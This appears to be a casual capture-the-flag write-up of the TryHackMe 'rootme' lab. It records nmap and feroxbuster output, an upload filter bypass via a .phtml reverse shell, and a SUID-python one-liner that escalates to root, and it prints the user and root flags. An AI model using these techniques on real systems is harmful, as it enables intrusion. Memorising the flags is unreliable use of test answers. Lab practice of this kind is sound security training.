---
title: rootme
tags:
  - fetus
---
## nmap results: 
- `Dscan.txt`:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 11:28 EDT
Nmap scan report for 10.10.245.148
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.21 seconds
```
## http enum: 
- didnt really find anything in the source or page 
- gonna do some dirbusting now
### dirbusting results: 
- `feroxbuster --url http://10.10.245.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```sh
200      GET       11l       22w      263c http://10.10.245.148/js/maquina_de_escrever.js
200      GET      105l      188w     1697c http://10.10.245.148/css/home.css
200      GET      100l      161w     1611c http://10.10.245.148/css/panel.css
301      GET        9l       28w      316c http://10.10.245.148/uploads => http://10.10.245.148/uploads/
200      GET       25l       44w      616c http://10.10.245.148/
301      GET        9l       28w      312c http://10.10.245.148/css => http://10.10.245.148/css/
301      GET        9l       28w      311c http://10.10.245.148/js => http://10.10.245.148/js/
301      GET        9l       28w      314c http://10.10.245.148/panel => http://10.10.245.148/panel/
```
- muhehehehe file uploader at `http://10.10.245.148/panel/`
- doesnt take any `php` files. gonna upload a custom `phtml` instead 
- yaay got the uploader
- uploaded a proper `php` reverse shell 
- got in as `www-data`
- `user.txt`:
```
THM{y0u_g0t_a_sh3ll}
```
- lets check SUID binaries
- SUID binaries:
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
- why is python an SUID binary lmao
- lets priv esc ig 
```
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
- yaaay got root
- root.txt:
```
THM{pr1v1l3g3_3sc4l4t10n}
```
